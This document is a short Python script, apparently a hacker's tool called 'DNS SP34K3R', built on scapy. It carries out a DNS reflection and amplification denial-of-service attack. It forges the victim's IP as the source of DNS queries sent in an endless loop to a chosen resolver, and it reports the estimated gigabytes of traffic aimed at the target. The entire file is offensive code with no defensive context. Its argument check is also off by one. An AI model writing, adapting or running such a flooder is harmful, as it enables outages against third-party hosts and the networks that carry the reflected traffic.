#DNS SP34K3R by:R00tendo


from scapy.all import *
import time
import sys
import socket

if len(sys.argv) < 4:
   print("Usage:python3 <program> TARGET_IP  TARGET_PORT  DNS_SERVER  REQUEST_TYPE(ALL CAPS)")
   sys.exit()


hostname = socket.gethostbyname(sys.argv[1])
dns_req = IP(dst=sys.argv[3]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=hostname, qtype='SOA'))

calc = sr1(dns_req, verbose=0)
print(calc.__len__())
calc = calc.__len__()
dns_req = IP(dst=str(sys.argv[3]), src=str(sys.argv[1])) / UDP(dport=53, sport=int(sys.argv[2])) / DNS(rd=1, qd=DNSQR(qname='google.com', qtype=str(sys.argv[4])))

a = 0
start = time.time()
current = 10.0

while True:
   a += 1
   answer = sr1(dns_req, timeout=0, verbose=False)
   if time.time() - start > current:
          amount = calc * (a*6)
          print("DNS SP34K3R PERFORMANCE UPDATE:" + str(a*6) + " REQUESTS PER MINUTE    DATA:" + str(amount /1000 /1000 /1000)+ " GB sent in a minute")
          current += 10.0